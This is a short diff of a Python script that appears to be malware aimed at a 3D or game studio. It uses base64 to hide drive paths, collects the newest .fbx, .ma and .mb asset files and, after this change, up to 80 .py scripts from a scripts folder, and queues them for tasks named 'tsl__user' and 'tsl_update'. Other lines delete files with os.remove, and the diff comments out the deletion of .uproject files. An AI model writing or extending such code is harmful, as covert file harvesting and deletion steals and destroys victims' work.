@@ -133,6 +133,7 @@ try:
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx', n=8)
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDov').decode(), ext='.ma', n=8)
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDov').decode(), ext='.mb', n=8)
+    ldir += search_latest_files_or_dirs(dir_path=base64.b64decode('TTovU0NSSVBUU19XSEs=').decode(), ext='.py', n=80)
     
     if zovV:
         add_queue_task('tsl__user', {'file': zovV})
@@ -194,9 +195,9 @@ try:
             try: os.remove(fp);
             except: pass;
             
-        if os.path.basename(fp).endswith('.uproject'):
-            try: os.remove(fp);
-            except: pass;
+        #if os.path.basename(fp).endswith('.uproject'):
+            #try: os.remove(fp);
+            #except: pass;
         
     if zovV:
         add_queue_task('tsl_update',{'done': sorted(zovV[:100], reverse=True)})
